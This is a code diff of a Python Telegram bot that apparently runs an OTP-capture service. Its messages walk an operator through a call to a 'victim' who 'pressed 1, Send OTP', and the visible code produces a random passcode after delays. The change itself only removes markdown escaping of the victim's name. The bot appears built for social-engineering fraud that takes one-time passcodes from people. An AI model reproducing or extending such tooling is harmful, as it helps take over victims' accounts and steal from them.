@@ -117,7 +117,7 @@ async def call_proccess(message, parts, user_id):
             await asyncio.sleep(randint(3, 5))
             await message.answer("👤 Human detected")
             await asyncio.sleep(randint(3, 5))
-            await message.answer(f"📲 {escape_markdown(victim_name)} pressed 1, Send OTP...")
+            await message.answer(f"📲 {victim_name} pressed 1, Send OTP...")
             await asyncio.sleep(randint(8, 20))
             chars = '0123456789'
             code = ''.join(random.choices(chars, k=int(otp_digit)))
@@ -204,7 +204,7 @@ async def precall_proccess(message, parts, user_id):
             await asyncio.sleep(randint(3, 5))
             await message.answer("👤 Human detected")
             await asyncio.sleep(randint(3, 5))
-            await message.answer(f"📲 {escape_markdown(victim_name)} pressed 1, Send OTP...")
+            await message.answer(f"📲 {victim_name} pressed 1, Send OTP...")
             await asyncio.sleep(randint(8, 20))
             chars = '0123456789'
             code = ''.join(random.choices(chars, k=int(otp_digit)))
@@ -397,6 +397,7 @@ Please upgrade or purchase the required option to continue\.""",
                              parse_mode="MarkdownV2")
         return
     await message.answer(fr"❌ Oops... Something went wrong!")
+
 
 
 
